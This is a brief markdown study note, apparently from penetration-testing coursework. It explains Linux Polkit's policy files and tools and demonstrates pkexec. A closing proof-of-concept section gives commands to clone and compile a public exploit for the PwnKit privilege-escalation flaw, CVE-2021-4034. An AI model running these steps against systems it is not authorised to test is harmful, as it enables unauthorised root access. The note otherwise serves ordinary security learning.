# Polkit

- [Introduction](#what-is-polkit)
- [POC](#poc)

### What is Polkit

Polkit works with two groups of files.
1. actions/policies (/usr/share/polkit-1/actions)
2. rules (/usr/share/polkit-1/rules.d)

> Polkit also has local authority rules which can be used to set or remove additional permissions for users and groups. Custom rules can be placed in the directory /etc/polkit-1/localauthority/50-local.d with the file extension `.pkla`.

PolKit also comes with three additional programs:
1. pkexec - runs a program with the rights of another user or with root rights
2. pkaction - can be used to display actions
3. pkcheck - this can be used to check if a process is authorized for a specific action

The most interesting tool for us, in this case, is `pkexec` because it performs the same task as sudo and can run a program with the rights of another user or root.

```bash
cry0l1t3@nix02:~$ # pkexec -u <user> <command>
cry0l1t3@nix02:~$ pkexec -u root id

uid=0(root) gid=0(root) groups=0(root)
```

### POC 
```bash
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc
``` 